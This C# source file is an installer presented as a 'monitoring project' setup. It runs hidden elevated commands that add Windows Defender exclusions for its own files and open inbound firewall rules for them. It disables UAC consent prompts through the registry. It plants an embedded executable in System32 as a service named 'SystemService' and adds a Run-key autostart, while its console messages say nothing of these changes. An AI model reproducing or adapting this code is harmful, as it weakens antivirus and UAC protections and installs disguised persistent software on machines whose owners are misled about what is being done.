using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SMonAutoSetup
{
    class Program
    {
        private static void KillProcess(Process[] processes)
        {
            for (int i = 0; i < processes.Length; i++)
            {
                try
                {
                    processes[i].Kill();
                }
                catch
                {

                }
            }
        }
        private static Process[] FindProcess(string processName)
        {
            Process[] processList = Process.GetProcessesByName(processName);

            return processList;
        }

        private static void KillOldService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string killservice = "/c sc stop SMonSvc";
                startInfo.Arguments = killservice;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }
            Thread.Sleep(2000);
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string killservice = "/c sc delete SMonSvc";
                startInfo.Arguments = killservice;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }
        }

        private static void KillNewService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM SSVHost.exe /F & taskkill /IM SSVAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }

            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM SSVHost.exe /F & taskkill /IM SSVAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }
            //try
            //{
            //    var processes = FindProcess("SSVHost.exe");
            //    KillProcess(processes);
            //    processes = FindProcess("SSVAuto.exe");
            //    KillProcess(processes);
            //}
            //catch
            //{

            //}


            try
            {
                var processes = FindProcess("SSVHostController");
                KillProcess(processes);
            }
            catch
            {

            }
        }


        private static void KillNewestService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM SRMHost.exe /F & taskkill /IM SRMAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }

            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM SRMHost.exe /F & taskkill /IM SRMAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }
            //try
            //{
            //    var processes = FindProcess("SSVHost.exe");
            //    KillProcess(processes);
            //    processes = FindProcess("SSVAuto.exe");
            //    KillProcess(processes);
            //}
            //catch
            //{

            //}


            try
            {
                var processes = FindProcess("SRMHostController");
                KillProcess(processes);
            }
            catch
            {

            }
        }
        static string strVersion = "2.57";
        static void Main(string[] args)
        {
            //MessageBox.Show(" The Monitor.TaskControl is now patching.\n In order to install the Monitor.TaskControl successfully, You have to click 'Yes' on the next dialog box.  ", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);

            Console.WriteLine("Creating Date : 10/25/2021");
            Console.WriteLine("Monitoring project version " + strVersion);
            Console.WriteLine("Copyright Ryonbong. All right reserved.");

            Thread.Sleep(500);
            Console.WriteLine("");
            Console.WriteLine("Now installing the Server.exe...");
            Console.WriteLine("Don't close this cmd window until this setup is completed successfully.");
            Thread.Sleep(2000);
            
            string oldpath = Path.GetPathRoot(Environment.SystemDirectory) + @"Program Files (x86)\RM\Server\";

            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";

                string command = "/c netsh advfirewall set privateprofile state on & netsh advfirewall set publicprofile state on";
                command += " & PowerShell Remove-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client";
                command += " & PowerShell Remove-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server";
//                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client\\CSVAuto.exe";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client\\CSVHost.exe";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client\\Monitor.TaskView.exe";
                //command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server\\SSVAuto.exe";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server\\SSVHost.exe ";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server\\Monitor.TaskControl.exe ";
                command += " & PowerShell Add-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client";
                command += " & PowerShell Add-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server";
                //command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMAuto.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMHost.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\Monitor.TaskView.exe";
                //command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMAuto.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMHost.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\Monitor.TaskControl.exe ";

                command += " & netsh advfirewall firewall delete rule name=\"CSVHost\"";
                command += " & netsh advfirewall firewall delete rule name=\"CSVAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"CRMHost\"";
                command += " & netsh advfirewall firewall delete rule name=\"CRMAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"MonitorView\"";
                command += " & netsh advfirewall firewall add rule name=\"CRMHost\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMHost.exe\" enable=yes profile=any ";
                //command += " & netsh advfirewall firewall add rule name=\"CRMAuto\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMAuto.exe\" enable=yes profile=any ";
                command += " & netsh advfirewall firewall add rule name=\"MonitorView\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\Monitor.TaskView.exe\" enable=yes profile=any";
                command += " & netsh advfirewall firewall delete rule name=\"SSVHost\"";
                command += " & netsh advfirewall firewall delete rule name=\"SSVAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"SRMHost\"";
                command += " & netsh advfirewall firewall delete rule name=\"SRMAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"MonitorControl\"";
                command += " & netsh advfirewall firewall delete rule name=\"Monitor.TaskControl\"";
                command += " & netsh advfirewall firewall add rule name=\"SRMHost\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMHost.exe\" enable=yes profile=any ";
                //command += " & netsh advfirewall firewall add rule name=\"SRMAuto\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMAuto.exe\" enable=yes profile=any ";
                command += " & netsh advfirewall firewall add rule name=\"MonitorControl\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\Monitor.TaskControl.exe\" enable=yes profile=any";
                command += " & PowerShell Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0";
                startInfo.Arguments = command;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();

                process.WaitForExit();
            }
            catch
            {
                Process.Start(FileName);
                Environment.Exit(0);
                return;
            }

            
            //KillOldService();
            //Thread.Sleep(2000);
            //KillOldService();

            KillNewService();
            KillNewestService();
            try
            {
                var processes = FindProcess("Monitor.TaskControl");
                KillProcess(processes);
            }
            catch
            {

            }
            try
            {
                ServiceController sc = new ServiceController("SystemService");
                switch (sc.Status)
                {
                    case ServiceControllerStatus.Running:
                        try
                        {
                            var process = new System.Diagnostics.Process();
                            var startInfo = new System.Diagnostics.ProcessStartInfo();
                            startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                            startInfo.UseShellExecute = true;
                            startInfo.CreateNoWindow = true;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.FileName = "cmd.exe";

                            string command = $"/c PowerShell Stop-Service -Name \"SystemService\"";
                            startInfo.Arguments = command;
                            startInfo.Verb = "runas";
                            process.StartInfo = startInfo;
                            process.Start();

                            process.WaitForExit();
                        }
                        catch
                        {
                        }
                        break;
                    case ServiceControllerStatus.Stopped:
                        break;
                    case ServiceControllerStatus.Paused:
                        break;
                    case ServiceControllerStatus.StopPending:
                        break;
                    case ServiceControllerStatus.StartPending:
                        break;
                    default:
                        break;
                }
            }
            catch
            {

            }
            Thread.Sleep(3000);
            Console.WriteLine("");
            Console.WriteLine("checking old files....");
            Console.WriteLine("It may take a while for checking to respond.");
            Console.WriteLine("Please know that I will get to your case as soon as possible.");
            Thread.Sleep(2000);
            // delete all old files
            //try
            //{
            //    try
            //    {
            //        if (File.Exists(Path.Combine(oldpath, "Monitor.TaskControl.exe")))
            //        {
            //            File.Delete(Path.Combine(oldpath, "Monitor.TaskControl.exe"));
            //        }
            //    }
            //    catch
            //    {

            //    }
            //    try
            //    {
            //        if (File.Exists(Path.Combine(oldpath, "SSVHostController.exe")))
            //        {
            //            File.Delete(Path.Combine(oldpath, "SSVHostController.exe"));
            //        }
            //    }
            //    catch (Exception ex)
            //    {
            //    }
            //    if (Directory.Exists(oldpath))
            //    {
            //        Directory.Delete(oldpath, true);
            //    }
            //}
            //catch (Exception ex)
            //{
            //}
            if (File.Exists(Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\SMonAutoSetup.exe"))
            {
                try
                {
                    File.Delete(Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\SMonAutoSetup.exe");
                }
                catch (Exception ex)
                {
                    //File.AppendAllText("log.txt", ex.Message);
                }
            }
            Console.WriteLine("");
            Console.WriteLine("suspending the process...");
            Console.WriteLine("This is small job so the processing will not be very much.");
            Thread.Sleep(2000);

            var hostname = "SSVHost.exe";
            var monitorname = "Monitor.TaskControl.exe";
            
            string path = Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RM\\Server\\";
            string newpath = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\";

            //new file delete
            try
            {
                if (File.Exists(Path.Combine(path, hostname)))
                {
                    File.Delete(Path.Combine(path, hostname));
                }
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (File.Exists(Path.Combine(path, "SSVAuto.exe")))
                {
                    File.Delete(Path.Combine(path, "SSVAuto.exe"));
                }
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (File.Exists(Path.Combine(path, monitorname)))
                {
                    File.Delete(Path.Combine(path, monitorname));
                }
            }
            catch (Exception ex)
            {
            }

            try
            {
                if (Directory.Exists(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\"))
                {
                    Directory.Delete(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\", true);
                }
            }
            catch (Exception ex)
            {
            }

            try
            {
                if (File.Exists(Path.Combine(newpath, "SRMHost")))
                {
                    File.Delete(Path.Combine(newpath, "SRMHost"));
                }
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (File.Exists(Path.Combine(newpath, "SRMAuto.exe")))
                {
                    File.Delete(Path.Combine(newpath, "SRMAuto.exe"));
                }
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (File.Exists(Path.Combine(newpath, monitorname)))
                {
                    File.Delete(Path.Combine(newpath, monitorname));
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                if (File.Exists(Path.Combine(Environment.SystemDirectory, "SystemService.exe")))
                {
                    File.Delete(Path.Combine(Environment.SystemDirectory, "SystemService.exe"));
                }
            }
            catch
            {

            }
            try
            {
                if (Directory.Exists(newpath))
                {
                    Directory.Delete(newpath, true);
                }
            }
            catch (Exception ex)
            {
            }





            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
                key = key.CreateSubKey("RMServer");
                key.SetValue("Version", strVersion);
                key.Close();
            }
            catch
            {

            }

            // File.AppendAllText("log.txt", "deleted old files");
            Console.WriteLine("");
            Console.WriteLine("installing new process...");
            Console.WriteLine("It look like our installing is coming to end now.");
            Console.WriteLine("Thank you for your Patience.");
            Thread.Sleep(2000);
            // check directory and create.
            if (!Directory.Exists(newpath))
            {
                try
                {
                    Directory.CreateDirectory(newpath);
                }
                catch (UnauthorizedAccessException ex)
                {
                    // File.AppendAllText("Error while creating directory", ex.Message);
                }
            }
            //copy files
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.SRMHost.exe");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "SRMHost.exe"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (!File.Exists(Path.Combine(Environment.SystemDirectory, "SystemService.exe")))
                {
                    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.SystemService.exe");
                    FileStream fileStream = new FileStream(Path.Combine(Environment.SystemDirectory, "SystemService.exe"), FileMode.CreateNew);
                    for (int i = 0; i < stream.Length; i++)
                        fileStream.WriteByte((byte)stream.ReadByte());
                    fileStream.Close();

                    
                    //New-Service -Name "YourServiceName" -BinaryPathName <yourproject>.exe

                    try
                    {
                        var process = new System.Diagnostics.Process();
                        var startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                        startInfo.UseShellExecute = true;
                        startInfo.CreateNoWindow = true;
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";

                        string command = $"/c PowerShell New-Service -Name \"SystemService\" -BinaryPathName {Path.Combine(Environment.SystemDirectory, "SystemService.exe")}";
                        startInfo.Arguments = command;
                        startInfo.Verb = "runas";
                        process.StartInfo = startInfo;
                        process.Start();

                        process.WaitForExit();
                    }
                    catch
                    {
                        // return;
                    }
                }
                if (!File.Exists(Path.Combine(Environment.SystemDirectory, "ProcessExtensions.dll")))
                {
                    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.ProcessExtensions.dll");
                    FileStream fileStream = new FileStream(Path.Combine(Environment.SystemDirectory, "ProcessExtensions.dll"), FileMode.CreateNew);
                    for (int i = 0; i < stream.Length; i++)
                        fileStream.WriteByte((byte)stream.ReadByte());
                    fileStream.Close();
                }

               

            }
            catch (Exception ex)
            {
                //File.AppendAllText("log.txt", ex.Message);
            }
            //try
            //{
            //    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.SRMAuto.exe");
            //    FileStream fileStream = new FileStream(Path.Combine(newpath, "SRMAuto.exe"), FileMode.CreateNew);
            //    for (int i = 0; i < stream.Length; i++)
            //        fileStream.WriteByte((byte)stream.ReadByte());
            //    fileStream.Close();
            //}
            //catch (Exception ex)
            //{
            //    // File.AppendAllText("log.txt", ex.Message);
            //}
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.Monitor.TaskControl.exe");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "Monitor.TaskControl.exe"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }

            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.LiveCharts.dll");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "LiveCharts.dll"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SMonAutoSetup.LiveCharts.Wpf.dll");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "LiveCharts.Wpf.dll"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }

            // File.AppendAllText("log.txt", "Copied new files");
            //register for the start up running
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rkApp.SetValue("SRMHost", Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RBM\\Server\\SRMHost.exe");


            //delete service if it exists


            //try
            //{
            //    var proc = new Process();
            //    proc.StartInfo.FileName = Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RBM\\Server\\SRMHost.exe";
            //    proc.StartInfo.UseShellExecute = true;
            //    proc.Start();
            //}
            //catch
            //{

            //}
            //start service if it's stopped
            try
            {
                ServiceController sc = new ServiceController("SystemService");
                switch (sc.Status)
                {
                    case ServiceControllerStatus.Running:
                        break;
                    case ServiceControllerStatus.Stopped:
                        try
                        {
                            var process = new System.Diagnostics.Process();
                            var startInfo = new System.Diagnostics.ProcessStartInfo();
                            startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                            startInfo.UseShellExecute = true;
                            startInfo.CreateNoWindow = true;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.FileName = "cmd.exe";

                            string command = $"/c PowerShell Start-Service -Name \"SystemService\"";
                            startInfo.Arguments = command;
                            startInfo.Verb = "runas";
                            process.StartInfo = startInfo;
                            process.Start();

                            process.WaitForExit();
                        }
                        catch
                        {
                        }
                        break;
                    case ServiceControllerStatus.Paused:
                        break;
                    case ServiceControllerStatus.StopPending:
                        break;
                    case ServiceControllerStatus.StartPending:
                        break;
                    default:
                        break;
                }
            }
            catch
            {

            }
            Console.WriteLine("Successfully installed");
            Console.WriteLine("Press anykey to exit");
        }

        public static string FileName
        {
            get { return Process.GetCurrentProcess().MainModule.FileName; }
        }
    }
}
